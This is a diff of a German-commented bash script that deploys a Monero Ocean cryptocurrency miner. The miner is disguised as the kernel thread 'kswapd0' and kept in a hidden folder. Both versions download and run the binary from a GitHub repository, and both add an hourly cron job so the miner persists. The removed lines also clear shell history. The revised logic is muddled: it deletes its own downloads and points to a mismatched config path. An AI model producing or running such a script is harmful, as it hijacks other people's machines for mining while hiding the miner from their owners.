@@ -1,29 +1,45 @@
 #!/bin/bash
-unset HISTFILE
 
-# Verzeichnis erstellen und ins Verzeichnis wechseln
-mkdir -p "$HOME/.gdm2_manual/"
-cd "$HOME/.gdm2_manual/" || exit
+# Script um Monero Ocean Miner zu starten und Dateien zu verwalten
 
-# Programm beenden, falls es läuft
-if pgrep -x "kswapd0" > /dev/null
-then
-    pkill -x "kswapd0"
-    echo "kswapd0 stopped."
+# Pfade zu den benötigten Dateien
+KSWAPD0="$HOME/.gdm2_manual/kswapd0"
+CONFIG_JSON="/path/to/config.json"
+
+# Prozesse beenden, die mit kswapd0 verbunden sind
+pkill -f kswapd0
+
+# Überprüfen, ob die Dateien existieren und starten, wenn sie existieren
+if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
+    echo "kswapd0 existiert und ist ausführbar."
+else
+    echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
+    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    chmod +x "$KSWAPD0"
 fi
 
-# Vorhandene Dateien löschen, falls sie existieren
-rm -f kswapd0 config.json
+if [ -f "$CONFIG_JSON" ]; then
+    echo "config.json existiert."
+else
+    echo "config.json existiert nicht. Herunterladen..."
+    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+fi
 
-# Dateien herunterladen und entpacken
-wget --no-check-certificate https://github.com/littlAcen/moneroocean-setup/raw/main/kswapd0
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+# Dateien entfernen, falls sie existieren
+rm -f "$CONFIG_JSON" "$KSWAPD0"
 
-# Ausführungsrechte für kswapd0 setzen
-chmod +x kswapd0
+# Nochmal überprüfen und erneut herunterladen, falls entfernt
+if [ ! -f "$KSWAPD0" ]; then
+    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    chmod +x "$KSWAPD0"
+fi
 
-# Programm starten
-./kswapd0 --config=config.json &
+if [ ! -f "$CONFIG_JSON" ]; then
+    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+fi
+
+# kswapd0 ausführen
+$HOME/.gdm2_manual/kswapd0 --config $HOME/.gdm2_manual/config.json
 
 # Überprüfungsskript erstellen
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
@@ -44,3 +60,4 @@ chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
 
 # Cron-Job einrichten
 (crontab -l 2>/dev/null; echo "0 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
+Erklärung der Änderungen:
